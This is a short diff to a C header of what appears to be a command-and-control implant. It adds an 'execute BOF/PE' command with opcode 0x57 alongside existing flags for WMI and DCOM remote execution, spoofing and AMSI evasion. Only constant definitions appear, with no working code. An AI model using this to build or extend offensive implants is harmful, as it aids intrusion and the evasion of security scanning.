@@ -91,6 +91,7 @@
 #define INCLUDE_CMD_DCOMEXEC
 #define INCLUDE_CMD_LLDP_CONNECT
 #define INCLUDE_CMD_LLDP_DISCONNECT
+#define INCLUDE_CMD_EXECUTE_BOFPE
 
 #define INCLUDE_EVASION_SPOOF
 #define INCLUDE_EVASION_AMSI
@@ -215,6 +216,7 @@
 #define CMD_LOAD                  0x54
 #define CMD_WMIEXEC               0x55
 #define CMD_DCOMEXEC              0x56
+#define CMD_EXECUTE_BOFPE         0x57
 
 #define CMD_LLDP_CONNECT          0x70
 #define CMD_LLDP_DISCONNECT       0x71
